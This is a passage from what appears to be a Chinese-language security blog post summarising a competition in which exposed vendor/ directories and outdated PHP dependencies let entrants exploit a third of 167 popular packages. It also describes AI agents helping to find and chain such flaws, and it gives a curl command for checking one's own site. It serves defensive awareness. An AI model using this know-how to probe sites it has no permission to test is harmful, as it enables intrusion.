這次挑出的 167 個熱門 PHP 套件（星星數大於 500、下載量超過 10 萬），有 53 個在這樣的部署設定下被打穿，接近三分之一。 **部署設定出了問題，就算是熱門專案，原本正常的功能也能被串成利用鏈。**

這次比賽也再次提醒我們：

-   **自己寫的 code 沒有洞，不代表整個網站就安全。** 引入的套件，以及它們在部署後能被誰呼叫，一樣是攻擊面。
-   **PHP 升版，不代表相依套件跟著變安全。** 就算把 PHP 升到 8.4，重新解析相依時，也可能把十年前的 PHPUnit 裝回來。

安全檢查如果只看到自己寫的程式碼，或只確認 runtime 有沒有更新，就會漏掉這些問題。好險到了 AI 時代，檢查已知相依性問題的成本已經低了很多。以前沒空一個一個翻的套件，現在可以先讓 agent 在背景跑個一小時，從實際安裝的版本、已知漏洞，一路追到哪些腳本能從 Web 執行，效果就會很好了。

從參賽的狀況來看，到了 2026 年 8 月，讓 AI 找出洞已經不稀奇， **能不能在各種限制下把洞串成利用，才是這次決定勝負的關鍵。** 複雜的利用還是需要人類給方向、出點子，有時甚至得幫忙開分身。但有了想法之後，很多過去要耗大量心力寫程式、反覆測試的工作，現在都能交給 AI 接著做。攻擊者把想法做成利用更快了，我們檢查問題的成本也更低了。這是最壞的時代，也是最美好的時代。

這次留下的套件清單，希望能讓以後做紅隊的人少花一些時間摸索，也讓開發者有具體的地方可以回頭檢查。以後出題，我還是想繼續找這類真實世界的問題。既然終究都要燒 token，就讓比賽多解掉幾個平常沒人有空追的困難問題。

看完文章，先去 `curl` 一下自己的站吧:p

```bash
curl -s https://你的網站/vendor/composer/installed.json | head
```

讀不到這份清單也別急著放心，其他 `vendor/` 入口還是要一起確認。
